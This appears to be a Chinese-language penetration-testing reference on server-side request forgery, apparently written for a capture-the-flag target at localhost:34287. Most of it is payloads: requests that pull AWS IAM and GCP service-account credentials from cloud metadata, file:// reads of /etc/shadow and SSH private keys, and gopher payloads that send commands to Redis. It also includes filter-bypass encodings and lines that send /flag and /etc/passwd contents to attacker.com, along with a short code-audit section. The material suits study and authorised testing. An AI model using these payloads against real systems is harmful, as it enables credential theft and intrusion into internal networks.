# SSRF 攻击：未验证 URL 输入利用

## 1. 技术介绍

### 1.1 漏洞原理

服务器端请求伪造（SSRF）漏洞发生在应用程序接受用户可控的 URL 参数并将其直接传递给 HTTP 客户端库（如 PHP 的 `file_get_contents()`、Python 的 `requests.get()`、cURL 等）时。攻击者可以利用此漏洞：

- 绕过网络隔离，访问内部服务
- 读取云元数据服务获取敏感凭证
- 扫描内网端口和服务
- 读取本地文件（通过 `file://` 协议）

### 1.2 漏洞本质

SSRF 漏洞的本质是**应用层信任边界违规**：应用程序错误地假设网络层隔离足以保护内部服务，而忽略了应用层请求可以绕过这些隔离。

### 1.3 常见危险函数

| 语言 | 危险函数/方法 | 协议支持 |
|------|--------------|---------|
| PHP | `file_get_contents()` | http, https, ftp, file, php, phar |
| PHP | `curl_exec()` | http, https, ftp, gopher, dict |
| Python | `requests.get()` | http, https |
| Python | `urllib.request.urlopen()` | http, https, file, ftp |
| Java | `HttpURLConnection` | http, https |
| Node.js | `http.get()` / `https.get()` | http, https |
| Ruby | `Net::HTTP.get()` | http, https |
| Go | `http.Get()` | http, https |

---

## 2. 攻击常见于哪些业务场景

### 2.1 常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| URL 预览/缩略图生成 | 社交媒体链接预览、文章缩略图抓取 | 用户提交的 URL 被服务器抓取并解析 |
| 文件导入/下载 | 从 URL 导入配置文件、下载远程资源 | 用户提供的下载链接被服务器访问 |
| Webhook 配置 | 配置回调 URL、通知服务地址 | 用户设置的回调地址被服务器调用 |
| 代理/转发服务 | URL 转发器、内容代理 | 用户指定目标 URL，服务器代为请求 |
| 站点监控 | 可用性检查、性能监控 | 用户输入监控目标 URL |
| 文档转换 | PDF 转 HTML、网页截图 | 用户提交文档 URL 进行转换 |
| 内部服务发现 | 微服务注册与发现 | 内部服务地址可能被外部探测 |

### 2.2 案例分析

SSRF 漏洞存在于 `/redirect.php` 端点：

```php
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];  // 用户输入直接赋值
    $response = file_get_contents($url);  // 无验证直接请求
    echo "<pre>" . htmlspecialchars($response) . "</pre>";
}
?>
```

**攻击路径：**
1. 攻击者访问：`http://localhost:34287/redirect.php?url=http://internal-service/`
2. 服务器执行 `file_get_contents("http://internal-service/")`
3. 内部服务响应包含敏感 FLAG
4. 攻击者成功获取敏感信息

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

抓取所有与后端交互的请求，重点关注以下参数：

| 参数名示例 | 可能的功能 | 风险等级 |
|-----------|-----------|---------|
| `url` | URL 跳转、内容抓取 | 高 |
| `target` | 目标地址 | 高 |
| `uri` | 资源定位符 | 高 |
| `path` | 文件路径 | 高 |
| `dest` | 目标地址 | 高 |
| `redirect` | 重定向地址 | 高 |
| `fetch` | 获取内容 | 高 |
| `download` | 下载地址 | 高 |
| `callback` | 回调地址 | 高 |
| `webhook` | Webhook 地址 | 高 |
| `image_url` | 图片地址 | 中 |
| `thumbnail` | 缩略图地址 | 中 |
| `avatar` | 头像地址 | 中 |

#### 3.1.2 初步探测 Payload

**基础探测：**
```
?url=http://example.com
?url=https://example.com
```

**内部网络探测：**
```
?url=http://localhost/
?url=http://127.0.0.1/
?url=http://internal-service/
?url=http://10.0.0.1/
?url=http://172.16.0.1/
?url=http://192.168.1.1/
```

**协议探测：**
```
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
?url=ftp://anonymous@ftp.example.com/
?url=gopher://127.0.0.1:25/_HELO%20localhost
?url=dict://127.0.0.1:11211/
```

**云环境探测：**
```
# AWS
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
?url=http://metadata.google.internal/computeMetadata/v1/
?url=http://169.254.169.254/computeMetadata/v1/

# Azure
?url=http://169.254.169.254/metadata/instance?api-version=2020-09-01

# Alibaba Cloud
?url=http://100.100.100.200/latest/meta-data/
```

#### 3.1.3 响应分析

| 响应特征 | 可能含义 | 后续动作 |
|---------|---------|---------|
| 返回正常网页内容 | URL 可访问，存在 SSRF | 尝试访问内部资源 |
| 返回连接超时 | 目标不可达或防火墙阻止 | 尝试其他 IP/端口 |
| 返回 DNS 解析错误 | 主机名不存在 | 尝试 IP 地址 |
| 返回 403/401 错误 | 服务存在但需要认证 | 记录服务存在 |
| 返回错误信息 | 可能暴露内部结构 | 分析错误信息 |
| 响应时间明显延长 | 网络延迟或大文件 | 可能成功访问 |

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

搜索以下危险函数调用：

**PHP:**
```bash
grep -rn "file_get_contents" *.php
grep -rn "curl_exec" *.php
grep -rn "fopen" *.php
grep -rn "fsockopen" *.php
grep -rn "pfsockopen" *.php
```

**Python:**
```bash
grep -rn "requests.get\|requests.post" *.py
grep -rn "urllib.request.urlopen" *.py
grep -rn "urlopen" *.py
```

**Java:**
```bash
grep -rn "HttpURLConnection" *.java
grep -rn "HttpClient.execute" *.java
grep -rn "RestTemplate.getForObject" *.java
```

#### 3.2.2 数据流追踪

检查用户输入是否流向危险函数：

```
用户输入 ($_GET['url'])
    ↓
变量赋值 ($url = $_GET['url'])
    ↓ (是否有验证？)
危险函数 (file_get_contents($url))
    ↓
响应输出 (echo $response)
```

**关键检查点：**
1. 输入是否经过 URL 格式验证？
2. 是否检查协议白名单？
3. 是否过滤内网 IP 地址？
4. 是否检查主机名黑名单？
5. 是否设置请求超时？
6. 是否限制响应大小？

---

## 4. 漏洞利用方法

### 4.1 基础信息收集

#### 4.1.1 内部服务发现

**Docker 环境：**
```
?url=http://internal-service/
?url=http://web-app/
?url=http://api-gateway/
?url=http://database/
```

**Kubernetes 环境：**
```
?url=http://kubernetes.default/
?url=http://kube-dns.kube-system.svc.cluster.local/
```

**常见内部服务：**
```
?url=http://prometheus:9090/
?url=http://grafana:3000/
?url=http://elasticsearch:9200/
?url=http://redis:6379/
?url=http://mysql:3306/
```

#### 4.1.2 端口扫描

**单端口探测：**
```
?url=http://internal-service:8080/
?url=http://internal-service:8443/
?url=http://internal-service:3000/
?url=http://internal-service:5000/
```

**批量扫描（使用 Burp Intruder 或自定义脚本）：**
```
端口列表：21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017
```

**基于时间的端口扫描：**
```
?url=http://internal-service:CLOSED_PORT/  → 快速响应（连接拒绝）
?url=http://internal-service:OPEN_PORT/   → 慢响应（等待服务响应）
```

### 4.2 敏感数据获取

#### 4.2.1 云元数据服务

**AWS EC2:**
```bash
# 获取实例元数据
curl "http://localhost:34287/redirect.php?url=http://169.254.169.254/latest/meta-data/"

# 获取 IAM 角色凭证
curl "http://localhost:34287/redirect.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 获取用户数据
curl "http://localhost:34287/redirect.php?url=http://169.254.169.254/latest/user-data/"
```

**GCP:**
```bash
# 获取项目信息
curl "http://localhost:34287/redirect.php?url=http://metadata.google.internal/computeMetadata/v1/project/"

# 获取服务账户令牌
curl "http://localhost:34287/redirect.php?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

#### 4.2.2 本地文件读取

**Linux 系统：**
```
?url=file:///etc/passwd
?url=file:///etc/shadow
?url=file:///etc/hosts
?url=file:///root/.ssh/id_rsa
?url=file:///home/user/.ssh/id_rsa
?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token
```

**Windows 系统：**
```
?url=file:///c:/windows/win.ini
?url=file:///c:/boot.ini
?url=file:///c:/users/administrator/.ssh/id_rsa
?url=file:///d:/xampp/apache/conf/httpd.conf
```

**应用配置文件：**
```
?url=file:///var/www/html/config.php
?url=file:///app/.env
?url=file:///app/config/database.yml
```

### 4.3 建立反向连接

#### 4.3.1 带外数据外带

**DNSLog 外带：**
```bash
# 使用 dnslog.cn 或 burpcollaborator
?url=http://$(whoami).attacker.com/
?url=http://attacker.com/$(cat /etc/passwd | base64)
```

**HTTP 外带：**
```bash
# 将命令执行结果发送到攻击者服务器
?url=http://attacker.com/?data=$(cat /flag | base64)
```

#### 4.3.2 利用 SSRF 执行命令

**如果内部服务存在命令执行漏洞：**
```bash
# 通过 SSRF 访问存在漏洞的内部服务
?url=http://vulnerable-internal-app.com/rce?cmd=whoami
```

**利用 Gopher 协议（如果支持）：**
```bash
# 通过 Gopher 协议与 Redis 交互执行命令
?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html
```

### 4.4 高级利用技术

#### 4.4.1 URL 重定向绕过

如果目标应用对 URL 进行重定向检查：
```bash
# 利用开放重定向
?url=http://allowed-domain.com/redirect?url=http://internal-service/

# 利用多次重定向链
?url=http://redirect1.com/ → http://redirect2.com/ → http://internal-service/
```

#### 4.4.2 DNS 重绑定攻击

```bash
# 使用 DNS 重绑定服务
?url=http://bindattacker.com/

# 第一次 DNS 查询返回允许的外部 IP
# 第二次 DNS 查询返回内部 IP
# 利用时间差绕过 IP 检查
```

#### 4.4.3 IPv6 绕过

```bash
# 利用 IPv6 映射地址
?url=http://[::ffff:7f00:1]/  # 127.0.0.1
?url=http://[0:0:0:0:0:ffff:7f00:1]/
```

#### 4.4.4 八进制/十六进制 IP 绕过

```bash
# 八进制表示
?url=http://0177.0.0.1/  # 127.0.0.1

# 十六进制表示
?url=http://0x7f.0x0.0x0.0x1/

# 十进制整数表示
?url=http://2130706433/  # 127.0.0.1
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过协议过滤

#### 5.1.1 协议混淆

```bash
# 如果过滤 http:// 使用 HTTPS
?url=https://internal-service/

# 如果过滤 file:// 使用混合大小写
?url=File:///etc/passwd
?url=fIlE:///etc/passwd

# 使用双斜杠变体
?url=http:///internal-service/
?url=http:////internal-service/
```

#### 5.1.2 协议替代

```bash
# 如果 HTTP 被过滤，尝试其他协议
?url=ftp://internal-service/
?url=gopher://internal-service:80/_GET%20/
?url=dict://internal-service:11211/
```

### 5.2 绕过 IP 地址过滤

#### 5.2.1 IP 地址编码

```bash
# 八进制
?url=http://0177.0.0.1/

# 十六进制
?url=http://0x7f000001/

# 十进制
?url=http://2130706433/

# 混合
?url=http://0x7f.1/
```

#### 5.2.2 IPv6 映射

```bash
?url=http://[::1]/
?url=http://[::ffff:127.0.0.1]/
?url=http://[0:0:0:0:0:ffff:7f00:1]/
```

#### 5.2.3 DNS 重绑定

```bash
# 使用 DNS 重绑定服务
?url=http://21698.rebind.pro/
?url=http://sslip.io/?dns=127.0.0.1
```

### 5.3 绕过主机名过滤

#### 5.3.1 DNS CNAME 链

```bash
# 创建多级 CNAME 记录
attacker.com → redirect1.com → redirect2.com → internal-service
```

#### 5.3.2 通配符 DNS

```bash
# 使用通配符 DNS 服务
?url=http://*.sslip.io/
```

#### 5.3.3 本地 DNS 注入

```bash
# 如果应用允许自定义 DNS
?url=http://internal-service.attacker.com/
# 攻击者 DNS 返回内部 IP
```

### 5.4 绕过 URL 解析差异

#### 5.4.1 URL 解析不一致

```bash
# 利用不同库的 URL 解析差异
?url=http://internal-service#@attacker.com/
# 某些解析器认为是 attacker.com，某些认为是 internal-service

?url=http://attacker.com@internal-service/
# 认证信息混淆
```

#### 5.4.2 路径混淆

```bash
# 利用路径解析差异
?url=http://internal-service//attacker.com
?url=http://internal-service/.@attacker.com
?url=http://internal-service/\@attacker.com
```

### 5.5 绕过重定向检查

#### 5.5.1 多重跳转

```bash
# 创建重定向链
?url=http://allowed1.com/  →  allowed2.com  →  internal-service
```

#### 5.5.2 条件重定向

```bash
# 基于 User-Agent 的条件重定向
# 第一跳检测 User-Agent，如果是扫描器则跳转到允许地址，否则跳转到内部服务
```

### 5.6 无回显 SSRF 利用

#### 5.6.1 时间盲注

```bash
# 使用延迟响应判断漏洞
?url=http://attacker.com/sleep?time=5
# 观察响应时间是否延长 5 秒
```

#### 5.6.2 DNSLog 外带

```bash
# 使用 dnslog.cn
?url=http://$(whoami).dnslog.cn/

# 使用 burpcollaborator
?url=http://collaborator-id.oastify.com/
```

#### 5.6.3 HTTP 外带

```bash
# 将数据发送到攻击者服务器
?url=http://attacker.com/?flag=$(cat /flag | base64)
```

---

## 6. 渗透测试决策流程

```
                                    ┌─────────────────┐
                                    │   SSRF 漏洞测试   │
                                    └────────┬────────┘
                                             │
                                             ▼
                                    ┌─────────────────┐
                                    │   输入点识别     │
                                    │  - URL 参数收集  │
                                    │  - 请求头分析    │
                                    │  - 文件上传分析  │
                                    └────────┬────────┘
                                             │
                    ┌────────────────────────┼────────────────────────┐
                    │                        │                        │
                    ▼                        ▼                        ▼
          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
          │  发现 URL 参数    │      │  发现文件上传   │      │  发现 Webhook   │
          └────────┬────────┘      └────────┬────────┘      └────────┬────────┘
                   │                        │                        │
                   ▼                        ▼                        ▼
          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
          │  ref/ssrf-      │      │  ref/ssrf-      │      │  ref/ssrf-      │
          │  attack-        │      │  phantomjs-     │      │  attack-        │
          │  advanced.md    │      │  attack.md      │      │  advanced.md    │
          └─────────────────┘      └─────────────────┘      └─────────────────┘
```

---

## 7. 常用 Payload 速查表

### 7.1 内部网络探测

| 目标 | Payload | 说明 |
|------|---------|------|
| 本地回环 | `http://localhost/` | 访问本机服务 |
| 本地回环 | `http://127.0.0.1/` | 访问本机服务 |
| Docker DNS | `http://internal-service/` | Docker 内部 DNS 解析 |
| AWS 元数据 | `http://169.254.169.254/latest/meta-data/` | AWS 实例元数据 |
| GCP 元数据 | `http://metadata.google.internal/` | GCP 元数据服务 |
| Azure 元数据 | `http://169.254.169.254/metadata/instance` | Azure 实例元数据 |

### 7.2 文件读取

| 系统 | Payload | 说明 |
|------|---------|------|
| Linux | `file:///etc/passwd` | 读取用户信息 |
| Linux | `file:///etc/shadow` | 读取密码哈希 |
| Windows | `file:///c:/windows/win.ini` | 读取系统配置 |
| Windows | `file:///c:/boot.ini` | 读取启动配置 |
| K8s | `file:///var/run/secrets/kubernetes.io/serviceaccount/token` | K8s 服务账户令牌 |

### 7.3 端口扫描

| 端口 | Payload | 常见服务 |
|------|---------|---------|
| 22 | `http://target:22/` | SSH |
| 80 | `http://target:80/` | HTTP |
| 443 | `http://target:443/` | HTTPS |
| 3306 | `http://target:3306/` | MySQL |
| 6379 | `http://target:6379/` | Redis |
| 8080 | `http://target:8080/` | HTTP 代理 |
| 9200 | `http://target:9200/` | Elasticsearch |

### 7.4 绕过技术

| 技术 | Payload | 说明 |
|------|---------|------|
| 八进制 IP | `http://0177.0.0.1/` | 绕过 IP 过滤 |
| 十六进制 IP | `http://0x7f000001/` | 绕过 IP 过滤 |
| 十进制 IP | `http://2130706433/` | 绕过 IP 过滤 |
| IPv6 | `http://[::1]/` | 绕过 IPv4 过滤 |
| DNS 重绑定 | `http://sslip.io/` | 绕过 DNS 检查 |
| 协议混淆 | `http:///target/` | 绕过协议检查 |

---

## 8. 参考资源

- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Testing](https://portswigger.net/web-security/ssrf)
- [AWS SSRF 防护最佳实践](https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-ssrf.html)
- [SSRF 地图项目](https://github.com/tarunkant/Gopherus)
